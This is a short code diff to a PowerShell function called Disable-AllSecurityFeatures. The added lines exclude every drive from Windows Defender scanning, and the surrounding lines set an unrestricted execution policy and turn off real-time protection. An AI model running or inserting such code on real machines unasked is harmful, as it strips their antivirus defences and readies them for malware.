@@ -35,6 +35,13 @@ function Disable-AllSecurityFeatures {
     #Set execution policy to unrestricted
     Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force; Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; Set-ExecutionPolicy Unrestricted -Scope Process -Force
 
+    #Set exclusion to the current drives
+    [ARRAY]$Drives = (Get-WmiObject -Class Win32_LogicalDisk).DeviceID
+    FOREACH ( $Drive IN $Drives){
+      $Drive = $Drive+"\"
+      Add-MpPreference -ExclusionPath "$Drive"
+    }
+    
     # Disable Windows Defender Real-Time Protection
     Set-MpPreference -DisableRealtimeMonitoring $true
 
